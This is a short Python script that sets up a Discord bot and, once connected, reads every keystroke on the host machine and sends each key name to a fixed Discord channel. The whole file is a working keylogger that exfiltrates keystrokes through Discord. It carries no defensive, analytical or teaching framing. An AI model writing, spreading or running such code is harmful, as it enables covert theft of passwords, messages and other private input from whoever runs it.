import os
import discord
from discord.ext import commands
from dotenv import load_dotenv
import keyboard

load_dotenv()
TOKEN = os.getenv("TOKEN")

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            await bot.get_channel(1529860890445479999).send(event.name)

bot.run(TOKEN)
